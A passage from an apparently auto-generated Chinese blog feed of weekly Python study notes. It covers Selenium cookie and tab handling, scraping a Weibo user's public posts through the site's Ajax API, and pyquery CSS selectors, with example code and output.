class="string">'value'</span>: <span class="string">'"AIBbIT5rLhGPTpMVZJCLnmYZXYPvh8AXzpM=|1587952896"'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'SESSIONID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'Ns5jG8TIaSE1aAjeOzckOayn6V6nDAubFTUf1DfCC2H'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_xsrf'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'6e9342c2-b0fd-4474-9099-193fef3e5595'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1651024896.073016, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_zap'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'2dbb5fb5-9f25-44ae-ac01-5183941f56df'</span>&#125;]</span><br><span class="line"></span><br><span class="line">[]</span><br></pre></td></tr></table></figure><br>可以看到我们添加的cookie被添加到了cookies中</p><h4 id="选项卡管理"><a href="#选项卡管理" class="headerlink" title="选项卡管理"></a>选项卡管理</h4><p>访问网页的时候，会开启一个个选项卡。在selenium中，我们可以对选项卡进行操作<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'window.open()'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(browser.window_handles)</span><br><span class="line">browser.switch_to.window(browser.window_handles[1])</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">time.sleep(1)</span><br><span class="line">browser.switch_to.window(browser.window_handles[0])</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://python.org'</span>)</span><br></pre></td></tr></table></figure><br>先访问了百度，然后调用了execute_script()方法，这里传入window.open()这个JavaScript语句开启一个选项卡。然后用windows_handles属性获取当前开启地所有选项卡，返回的是选项卡的代码列表。想要切换，只需要使用switch_to.window()方法，其中是选项卡的代号即可。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.安装selenium之后，还需要根据浏览器的不同，安装对应的webdriver，例如Chrome的webdriver</p><p>2.webdriver需要放在浏览器的根目录中，并且在环境变量中引入，如果在管理员模式下cmd中，输入对应webdriver的名字，有正常显示就表示环境变量成功</p><p>3.如果需要通过python来对浏览器进行操作，还需要将对应的webdriver放入到python的根目录下</p><p>4.selenium可以操作浏览器自动完成一些操作，所以需要注意一些危险操作，以免操作信息泄露</p><p>5.selenium功能强大，可以使用动作链和节点交互功能完成一系列重复性操作，例如抢课等</p>]]></content:encoded>
      
      <comments>http://yoursite.com/2020/04/26/Python3-2020-4-26-%E5%91%A8%E6%8A%A59/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Python3-2020/4/18-周报8</title>
      <link>http://yoursite.com/2020/04/18/Python3-2020-4-18-%E5%91%A8%E6%8A%A58/</link>
      <guid>http://yoursite.com/2020/04/18/Python3-2020-4-18-%E5%91%A8%E6%8A%A58/</guid>
      <pubDate>Sat, 18 Apr 2020 01:17:00 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;Ajax&quot;&gt;&lt;a href=&quot;#Ajax&quot; class=&quot;headerlink&quot; title=&quot;Ajax&quot;&gt;&lt;/a&gt;Ajax&lt;/h1&gt;&lt;h2 id=&quot;什么是Ajax&quot;&gt;&lt;a href=&quot;#什么是Ajax&quot; class=&quot;headerlink&quot; title=&quot;什么是
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><h2 id="什么是Ajax"><a href="#什么是Ajax" class="headerlink" title="什么是Ajax"></a>什么是Ajax</h2><p>全称是Asynchronous JavaScript and XML,即异步的JavaScript和XML。利用了JavaScript在保证页面不被刷新，页面链接不改变的情况下与服务器交换数据并更新部分网页的技术<br><a href="https://www.w3school.com.cn/ajax/ajax_xmlhttprequest_send.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/ajax/ajax_xmlhttprequest_send.asp</a></p><h3 id="实例引入"><a href="#实例引入" class="headerlink" title="实例引入"></a>实例引入</h3><p>访问<a href="https://m.weibo.cn/u/2830678474" target="_blank" rel="noopener">https://m.weibo.cn/u/2830678474</a><br><img src="/images/python3/ajax0.png" alt="avatar"></p><p>向下滑，滑几个微博之后，就会出现这种加载中的画面，这其实就是Ajax的加载过程</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>分为3个步骤：<br>1）发送请求<br>2）解析内容<br>3）渲染网页</p><p>JavaScript可以实现页面的各种交互功能，Ajax也不例外，它也是由JavaScript来实现的<br>执行了如下代码：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var xmlhttp;</span><br><span class="line"><span class="keyword">if</span>(window.XMLHttpRequest)&#123;</span><br><span class="line"><span class="attribute">xmlhttp</span>=new HttpRequest();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="attribute">xmlhttp</span>=new ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xmlhttp.<span class="attribute">onreadystatechange</span>=function()&#123;</span><br><span class="line"><span class="keyword">if</span>(xmlhttp.<span class="attribute">readyState</span>==4&amp;&amp;xmlhttp.status==200)</span><br><span class="line">    document.getElementById(<span class="string">"myDiv"</span>).<span class="attribute">innerHTML</span>=xmlhttp.responseText;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"/ajax/"</span>,<span class="literal">true</span>)</span><br><span class="line">xmlhttp.end</span><br></pre></td></tr></table></figure><br>这是JavaScript对Ajax最底层的实现，实际上就是新建了XMLHttpRequest对象，然后调用onreadystatechange属性设置了监听，然后调用open()和send()方法向某个链接发送了请求。由于设置了监听，所以当服务器返回响应时，onreadystatechange对应的方法便会被触发，然后在这个方法里解析响应内容即可</p><h3 id="解析内容"><a href="#解析内容" class="headerlink" title="解析内容"></a>解析内容</h3><p>得到响应之后，onreadystatechange属性对应的方法便会被触发，此时利用xmlhttp的responseText属性便会取到响应内容。这类似于python中利用requests向服务器发起请求，然后得到响应的过程。那么返回内容可能是HTML,也可能是JSON，接下来只需要在方法中用JavaScript进一步处理即可。</p><h3 id="渲染网页"><a href="#渲染网页" class="headerlink" title="渲染网页"></a>渲染网页</h3><p>JavaScript有改变网页内容的能力，解析完响应内容之后，就可以调用JavaScript来针对解析完的内容对网页进行下一步处理了。比如，通过document.getElementById().innerHTML这样的操作，便可以对某个元素内的源代码进行更改，这样网页显示的内容就改变了，这样的操作也被称为DOM操作，即对Document网页文档进行操作。</p><h2 id="Ajax分析方法"><a href="#Ajax分析方法" class="headerlink" title="Ajax分析方法"></a>Ajax分析方法</h2><p>之前微博的例子，知道拖动刷新的内容由Ajax加载，而且URL没有变化，所以就需要借助开发者工具</p><h3 id="查看请求"><a href="#查看请求" class="headerlink" title="查看请求"></a>查看请求</h3><p><img src="/images/python3/ajax1.png" alt="avatar"><br>F12使用开发者工具，查看Elements选项卡中便会观察到网页的源代码，右侧便是节点的样式</p><p>接着切换到NetWork选项卡，刷新一下会出现很多条目，Ajax其实有其特殊的请求类型，叫做xhr，我们可以发现一个名称为getIndex开头的请求，其Type为xhr，这就是一个Ajax请求<br><img src="/images/python3/ajax2.png" alt="avatar"><br><img src="/images/python3/ajax3.png" alt="avatar"><br>再点一下Preview<br><img src="/images/python3/ajax4.png" alt="avatar"><br>这里返回的就是个人信息，如名称，简介，头像等，这是用来渲染个人主页所使用的数据<br>再切换到Response选项卡，从中观察到真实的返回数据<br><img src="/images/python3/ajax5.png" alt="avatar"><br>接下来切换到第一个请求，查看它的Response<br><img src="/images/python3/ajax6.png" alt="avatar"><br>发现只有不到50行代码，但是执行了一些JavaScript</p><h3 id="过滤请求"><a href="#过滤请求" class="headerlink" title="过滤请求"></a>过滤请求</h3><p>使用开发者工具，筛选出所有的XHR<br><img src="/images/python3/ajax7.png" alt="avatar"><br>这样就可以清楚的看到XHR的URL Headers等内容了</p><h2 id="Ajax结果提取"><a href="#Ajax结果提取" class="headerlink" title="Ajax结果提取"></a>Ajax结果提取</h2><p>接下来用python模拟Ajax请求，把发过的微博爬取下来</p><h3 id="分析请求"><a href="#分析请求" class="headerlink" title="分析请求"></a>分析请求</h3><p>打开XHR过滤后，然后滑动页面会发现加载新的微博内容，并且不断会有Ajax请求发出</p><p>选定一个请求，分析它的参数信息。<br><img src="/images/python3/ajax8.png" alt="avatar"><br>可以看到这是一个GET类型的请求，参数有4个type,value,containerid和page</p><p>再看看其他请求，发现这几个参数始终如一。type始终为uid，value就是页面链接中的数字，这其实就是用户的id，containerid它就是107603加上用户id，改变的值就是page，是用来控制分页的</p><h3 id="分析响应"><a href="#分析响应" class="headerlink" title="分析响应"></a>分析响应</h3><p><img src="/images/python3/ajax9.png" alt="avatar"><br>这个内容是JSON格式的，开发者工具自动做了解析方便我们查看，可以看到最关键的部分就是cardlistInfo和cards:前者包含一个比较重要的信息total，观察后可以发现，它是微博的总数量；后者则是一个列表，随便展开一个查看<br><img src="/images/python3/ajax10.png" alt="avatar"><br>这里面的mblog比较重要，展开后发现正是微博的一些信息，比如attitudes_count（赞数目），comments_count(评论数目)，reposts_count(转发数目)，created_at(发布时间),text(微博正文)等</p><p>这样我们请求一个接口，就可以得到10条微博，请求时只需要改变page参数即可</p><h3 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h3><p>我们用Python来模拟这些请求，将他前10页的微博全部爬取下来<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse import  urlencode</span><br><span class="line"><span class="keyword">from</span> pyquery import PyQuery as pq</span><br><span class="line"><span class="attribute">base_url</span>=<span class="string">"https://m.weibo.cn/api/container/getIndex?"</span></span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'Host'</span>:<span class="string">'m.weibo.cn'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>:<span class="string">'https://m.weibo.cn/u/2830678474'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'X-Requested-With'</span>:<span class="string">'XMLHttpRequest'</span></span><br><span class="line">&#125;</span><br><span class="line">max_page = 10</span><br><span class="line"></span><br><span class="line">def get_page(page):</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">'type'</span>:<span class="string">'uid'</span>,</span><br><span class="line">        <span class="string">'value'</span>:<span class="string">'2830678474'</span>,</span><br><span class="line">        <span class="string">'containerid'</span>:<span class="string">'1076032830678474'</span>,</span><br><span class="line">        <span class="string">'page'</span>: page</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">url</span>=base_url+urlencode(params)</span><br><span class="line">    try:</span><br><span class="line">        <span class="attribute">response</span>=requests.get(url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.<span class="attribute">status_code</span>==200:</span><br><span class="line">            return response.json()</span><br><span class="line">    except requests.ConnectionError as e:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'Error'</span>,e.args)</span><br><span class="line"></span><br><span class="line">def parse_page(json):</span><br><span class="line">    <span class="keyword">if</span> json:</span><br><span class="line">        items = json.<span class="builtin-name">get</span>(<span class="string">'data'</span>).<span class="builtin-name">get</span>(<span class="string">'cards'</span>)</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">            item = item.<span class="builtin-name">get</span>(<span class="string">'mblog'</span>)</span><br><span class="line">            weibo = &#123;&#125;</span><br><span class="line">            weibo[<span class="string">'id'</span>] = item.<span class="builtin-name">get</span>(<span class="string">'id'</span>)</span><br><span class="line">            weibo[<span class="string">'text'</span>] = pq(item.<span class="builtin-name">get</span>(<span class="string">'text'</span>)).text()</span><br><span class="line">            weibo[<span class="string">'attitudes'</span>] = item.<span class="builtin-name">get</span>(<span class="string">'attitudes_count'</span>)</span><br><span class="line">            weibo[<span class="string">'comments'</span>] = item.<span class="builtin-name">get</span>(<span class="string">'comments_count'</span>)</span><br><span class="line">            weibo[<span class="string">'reposts'</span>] = item.<span class="builtin-name">get</span>(<span class="string">'reposts_count'</span>)</span><br><span class="line">            yield weibo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span><span class="built_in"> page </span><span class="keyword">in</span> range(1, max_page + 1):</span><br><span class="line">        json = get_page(page)</span><br><span class="line">        results = parse_page(json)</span><br><span class="line">        <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">            <span class="builtin-name">print</span>(result)</span><br></pre></td></tr></table></figure></p><p>这样就把前10页的微博都爬取下来了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.首先要判断是否为Ajax,具体方法就是下拉，看是否会有加载新内容，并关注开发中工具中的NetWork选项卡，查看有变化</p><p>2.在筛选XHR时，要注意其中的内容和URL变化，如果是靠翻页来更新内容的，就不是Ajax</p><p>3.URL变化也是判断是否为Ajax的重要选项，例如微博中的id等参数就没有变化，并且主页代码很少且执行了JS，综合一下就可以判断是否为Ajax</p><p>4.目前不一定能爬取到，例如今日头条中的图片，参数设置为了abstract，这样就没有办法爬取到了</p>]]></content:encoded>
      
      <comments>http://yoursite.com/2020/04/18/Python3-2020-4-18-%E5%91%A8%E6%8A%A58/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Python3-2020/4/11-周报7</title>
      <link>http://yoursite.com/2020/04/11/Python3-2020-4-11-%E5%91%A8%E6%8A%A57/</link>
      <guid>http://yoursite.com/2020/04/11/Python3-2020-4-11-%E5%91%A8%E6%8A%A57/</guid>
      <pubDate>Sat, 11 Apr 2020 06:51:47 GMT</pubDate>
      <description>
      
        
        
          &lt;h1 id=&quot;pyquery&quot;&gt;&lt;a href=&quot;#pyquery&quot; class=&quot;headerlink&quot; title=&quot;pyquery&quot;&gt;&lt;/a&gt;pyquery&lt;/h1&gt;&lt;h2 id=&quot;基本CSS选择器&quot;&gt;&lt;a href=&quot;#基本CSS选择器&quot; class=&quot;headerli
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="pyquery"><a href="#pyquery" class="headerlink" title="pyquery"></a>pyquery</h1><h2 id="基本CSS选择器"><a href="#基本CSS选择器" class="headerlink" title="基本CSS选择器"></a>基本CSS选择器</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">print(doc('#container .list li'))</span><br><span class="line">print(type(doc('#container .list li')))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     </span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">pyquery.pyquery.PyQuery</span>'&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们初始化pyquery对象之后，传入了一个CSS选择器#container.list li 它的意思是先选取id为container的节点，然后再选取其内部的class为list的节点内部的所有li节点。然后，打印输出。</p><h2 id="查找节点"><a href="#查找节点" class="headerlink" title="查找节点"></a>查找节点</h2><p>pyquery中的查询函数与jquery中函数的用法完全相同</p><h3 id="子节点"><a href="#子节点" class="headerlink" title="子节点"></a>子节点</h3><p>查询子节点时，需要用到find()方法，此时传入的参数是CSS选择器<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">html = '''</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">'''</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line">doc = pq(html)</span><br><span class="line">items = doc('.list')</span><br><span class="line">print(type(items))</span><br><span class="line">print(items)</span><br><span class="line">lis = items.find('li')</span><br><span class="line">print(type(lis))</span><br><span class="line">print(lis)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">pyquery.pyquery.PyQuery</span>'&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link5.html"</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">pyquery.pyquery.PyQuery</span>'&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0"</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link2.html"</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-0 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link3.html"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bold"</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item-1 active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"link4.html"</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span 